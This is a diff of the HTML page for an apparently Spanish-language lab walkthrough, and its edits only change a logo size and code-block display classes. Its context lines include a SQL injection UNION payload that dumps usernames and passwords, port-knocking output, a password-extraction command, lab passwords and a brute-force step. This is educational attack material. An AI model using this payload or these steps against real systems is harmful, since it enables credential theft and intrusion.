@@ -56,8 +56,8 @@ Escaneo de la Red El primer paso es encontrar la ip de nuestro objetivo, para el
             "name": "xxxx","logo": {
                     "@type": "ImageObject",
                     "url": "https:\/\/antusec.github.io\/images\/avatar.png",
-                    "width":  398 ,
-                    "height":  292 
+                    "width":  1024 ,
+                    "height":  1024 
                 }},"author": {
                 "@type": "Person",
                 "name": "Antu"
@@ -191,7 +191,7 @@ Escaneo de la Red El primer paso es encontrar la ip de nuestro objetivo, para el
         title="Untitled" width="731" height="209" /></p>
 <p>Hemos descubierto que la ip de nuestro objetivo es la 192.168.34.5.</p>
 <p>Una vez obtenida la ip pasamos a un escaneo de puertos y servicios con nmap.</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
@@ -286,7 +286,7 @@ Escaneo de la Red El primer paso es encontrar la ip de nuestro objetivo, para el
         <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
         <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select  null,CONCAT(username, &#34;:&#34; ,password),null,null,null,null from users.UserDetails-- -</span></span></span></code></pre></div></div>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
@@ -436,7 +436,7 @@ Escaneo de la Red El primer paso es encontrar la ip de nuestro objetivo, para el
 </span></span><span class="line"><span class="cl">hitting tcp 192.168.34.5:8475
 </span></span><span class="line"><span class="cl">hitting tcp 192.168.34.5:9842</span></span></code></pre></div></div>
 <p>Compruebo que el puerto se haya abierto</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
@@ -469,7 +469,7 @@ Escaneo de la Red El primer paso es encontrar la ip de nuestro objetivo, para el
         <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
         <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat creds <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 &gt; passwords.txt</span></span></code></pre></div></div>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
@@ -527,7 +527,7 @@ Escaneo de la Red El primer paso es encontrar la ip de nuestro objetivo, para el
 </span></span><span class="line"><span class="cl">B4-Tru3-001
 </span></span><span class="line"><span class="cl">4uGU5T-NiGHts</span></span></code></pre></div></div>
 <p>realizo un nuevo ataque de fuerza bruta con las passwords obtenidas</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
